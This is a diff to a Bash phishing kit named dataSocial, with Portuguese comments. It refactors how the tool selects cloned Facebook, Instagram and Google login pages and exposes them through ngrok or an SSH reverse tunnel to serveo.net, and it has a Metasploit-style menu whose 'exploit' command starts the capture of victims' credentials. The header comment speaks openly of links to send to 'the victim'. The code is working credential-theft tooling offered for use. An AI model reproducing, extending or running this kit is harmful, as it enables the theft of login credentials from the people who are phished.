@@ -10,7 +10,7 @@
 #
 # Exemplo:
 #
-# $ ./dataSocial -s facebook -l -t ngrok
+# $ ./dataSocial --service facebook --tunnel ssh --listen
 #
 # [+] Dados para enviar a vítima:
 # [+] Localhost: localhost:5555
@@ -42,6 +42,8 @@
 #     Adicionado suporte ao modo interativo
 # v0.7 2023-04-27, Oliver Silva:
 #     Adicionado algumas regras no prompt bloqueando algumas teclas de atalhos
+# v0.8 2023-08-31, Oliver Silva:
+#     Adicionado mais uma tela google e refatoração
 #
 # Licença: MIT License
 #
@@ -52,6 +54,7 @@
 # Versão 0.5: Repetição do ataque caso precise
 # Versão 0.6: Modo interativo adicionado
 # Versão 0.7: Tratamento do prompt, bloqueio das teclas de atalho
+# Versão 0.8: Página do gooogle atualizada, refatoração.
 #
 
 trap interruptTwo SIGINT SIGTSTP
@@ -65,8 +68,37 @@ serviceKey=0
 listenKey=0
 tunnelKey=0
 
-services=("facebook" "instagram" "google")
-tunnels=("ngrok" "ssh")
+# Checa serviço
+checkService() {
+    serviceSelected=$1
+
+    if [ -d ./websites/$serviceSelected ] ; then
+        echo -e "\n\e[0m\e[31;1mService => $serviceSelected\e[0m"
+    else
+        echo -e "\n\e[0m\e[33;1mInvalid service => $serviceSelected\e[0m"
+	unset serviceSelected
+    fi
+}
+
+# Checa tunnel
+checkTunnel() {
+    tunnelSelected=$1
+    serviceSelected=$2
+
+    # Checa se o serviço foi selecionado antes do 'tunnel'
+    if [ -n "$serviceSelected" ] ; then
+
+        if [ -f ./tunnels/$tunnelSelected ] ; then
+      	    echo -e "\n\e[0m\e[31;1mTunnel => $tunnelSelected\e[0m"
+        else
+	    echo -e "\n\e[0m\e[33;1mInvalid tunnel => $tunnelSelected\e[0m"
+	    unset tunnelSelected
+        fi
+    else
+	echo -e "\n\e[0m\e[33;1m[!] Select a service before defining the tunnel\e[0m"
+	unset tunnelSelected
+    fi
+}
 
 verifyLinks() {
     if [ "$1" == "null" -a "$2" == "null" ] ; then
@@ -87,13 +119,7 @@ interruptTwo() {
 }
 
 listen() {
-    if  [ -n "$tunnel" -a "$tunnel" == "ngrok" ] ; then
-	functionGroup
-
-    else
-	functionGroup
-
-    fi
+    functionGroup
 }
 
 functionGroup() {
@@ -117,6 +143,8 @@ removeFiles() {
 }
 
 copyFiles() {
+    service=$serviceSelected
+
     [ ! -d ./www ] && mkdir ./www
 
     if [ -d websites/${service} ] ; then
@@ -129,20 +157,22 @@ copyFiles() {
 }
 
 tunnel() {
-    if [ "$tunnel" == "ngrok" ] ; then
-        ngrok http $port --log=stdout > /dev/null 2>&1 &
-        sleep 3
-        showLinkNgrok
-
-    elif [ "$tunnel" == "ssh" ] ; then
-	ssh -tt -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R $service:$port:$host:$port serveo.net > /dev/null 3>&2 &
-	sleep 3
-	showLinkSSH
-
-    else
-	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis tunnel is not available\e[0m"
-	exit 1
-    fi
+    case "$tunnelSelected" in
+	"ngrok")
+	    ngrok http $port --log=stdout > /dev/null 2>&1 &
+            sleep 3
+            showLinkNgrok
+	    ;;
+        "ssh")
+	    ssh -tt -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=60 -R $service:$port:$host:$port serveo.net > /dev/null 3>&2 &
+	    sleep 3
+	    showLinkSSH
+	    ;;
+	*)
+	    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis tunnel is not available\e[0m"
+	    exit 1
+	    ;;
+    esac
 }
 
 
@@ -260,8 +290,11 @@ version() {
 list() {
     array="$1"
     count=1
-    echo "All"
-    for index in $array ; do
+
+    echo -e "\n\e[0mAll $2\e[0m"
+
+    for index in $array/* ; do
+	index=$(basename "$index")
 	echo -e "\e[0m$count => \e[0m\e[32;2m$index\e[0m"
 	count=$((count +1))
     done
@@ -354,7 +387,7 @@ usage_i() {
 }
 
 options_i() {
-    echo -e "\n\e[0mModule options (service/${service:-No service}):\n\n\tName\tCurrent Setting\tRequire\tDescription\n\t----\t---------------\t-------\t-----------\n\tTunnel\t[${tunnel:-No tunnel}]\t\tno\tAllow the tunnel\n\n"
+    echo -e "\n\e[0mModule options (service/${1:-No service}):\n\n\tName\tCurrent Setting\tRequire\tDescription\n\t----\t---------------\t-------\t-----------\n\tTunnel\t[${2:-No tunnel}]\t\tno\tAllow the tunnel\n\n"
 }
 
 menu() {
@@ -421,19 +454,17 @@ menu() {
 		    if [[ -n "${comm:5}" ]] ; then
 
 			if [[ "${comm:5:8}" == "services" ]] ; then
+      	    	            list ./websites/ "services"
 			    commands[$count]=$comm
-		
-      	    	            list "${services[*]}"
 
 			elif [[ "${comm:5:7}" == "tunnels" ]] ; then
+			    list ./tunnels "tunnels"
 			    commands[$count]=$comm
-
-			    list "${tunnels[*]}"
 
 			elif [[ "${comm:5:7}" == "options" ]] ; then
 			    commands[$count]=$comm
 
-			    options_i
+			    options_i "$serviceSelected" "$tunnelSelected"
 
 			else
 
@@ -457,26 +488,12 @@ menu() {
 			    commands[$count]=$comm
 
 			    if [[ -n "${comm:12}" ]] ; then
-				 
-				case "${comm:12}" in
-				    "facebook")
-
-					commands[$count]=$comm
-					service="${comm:12}"
-					echo -e "\n\e[0m\e[31;1mService => $service\e[0m";;
-
-				    "instagram")
-
-					commands[$count]=$comm
-					service="${comm:12}"
-					echo -e "\n\e[0m\e[31;1mService => $service\e[0m";;
-
-				    *)
-					echo -e "\n\e[0m\e[33;1mCommands = show services - ?\e[0m";;
-			        esac
-
+				
+				commands[$count]=$comm
+			        checkService "${comm:12}"
+				
 		            else
-				echo -e "\n\e[0m\e[33;1mCommands = facebook - instagram - ?\e[0m"
+				echo -e "\n\e[0m\e[33;1mCommands = show services - ?\e[0m"
 
 			    fi
 
@@ -499,35 +516,8 @@ menu() {
 			
 			if [[ -n "${comm:11}" ]] ; then
 
-			    case "${comm:11}" in
-				"ngrok")
-
-				    commands[$count]=$comm
-
-				    if [[ -n "$service" ]] ; then
-			                tunnel=${comm:11}
-				        echo -e "\n\e[0m\e[31;1mTunnel => $tunnel\e[0m"
-				    else
-					echo -e "\n\e[0m\e[33;1m[!] Select a service before defining the tunnel\e[0m"
-				    fi
-				    ;;
-
-				"ssh")
-
-				    commands[$count]=$comm
-
-				    if [[ -n "$service" ]] ; then
-				        tunnel=${comm:11}
-				        echo -e "\n\e[0m\e[31;1mTunnel => $tunnel\e[0m"
-				    else
-					echo -e "\n\e[0m\e[33;1m[!] Select a service before defining the tunnel\e[0m"
-				    fi
-				    ;;
-
-				*)
-				    echo -e "\n\e[0m\e[33;1m[!] invalid tunnel\e[0m";;
-
-	    		    esac
+			    commands[$count]=$comm
+			    checkTunnel "${comm:11}" "$serviceSelected"
 
 			else
 			    echo -e "\n\e[0m\e[33;1mCommands = ngrok - ssh - show tunnels - ?\e[0m"
@@ -545,16 +535,16 @@ menu() {
 		     [[ "${comm:0:7}" == "exploit" ]] ; then
 		    commands[$count]=$comm
 
-		    if [[ -n "$service" ]] && 
-		       [[ -z "$tunnel" ]] then
+		    if [[ -n "$serviceSelected" ]] && 
+		       [[ -z "$tunnelSelected" ]] then
 			echo -e "\n\e[0mRunning the setup locally\e[0m..."
-			args="--listen --service $service"
+			args="--listen --service $serviceSelected"
 			listen && getDataCaptured
 
-		    elif [[ -n "$service" ]] && 
-			[[ -n "$tunnel" ]] ; then
+		    elif [[ -n "$serviceSelected" ]] && 
+			[[ -n "$tunnelSelected" ]] ; then
 			echo -e "\n\e[0mRunning the configuration with tunnel\e[0m..."
-			args="--listen --service $service --tunnel $tunnel"
+			args="--listen --service $serviceSelected --tunnel $tunnelSelected"
 			listen && tunnel && getDataCaptured
 
 		    else
@@ -612,9 +602,9 @@ while [ -n "$1" ] ; do
 	-v | --version)
 	    version && exit 0;;
 	-S | --services)
-	    list "${services[*]}" && exit 0;;
+	    list ./websites "services" && exit 0;;
 	-T | --tunnels)
-	    list "${tunnels[*]}" && exit 0;;
+	    list ./tunnels "tunnels" && exit 0;;
 	-s | --service)
 	    shift
 
@@ -624,7 +614,7 @@ while [ -n "$1" ] ; do
 	    fi
 
 	    serviceKey=1
-	    service="$1";;
+	    serviceSelected="$1";;
 
 	-l | --listen)
 	    listenKey=1;;
@@ -637,7 +627,7 @@ while [ -n "$1" ] ; do
 	    fi
 
 	    tunnelKey=1
-	    tunnel="$1"
+	    tunnelSelected="$1"
 	    ;;
         -i | --interactive)
 	    checkReq
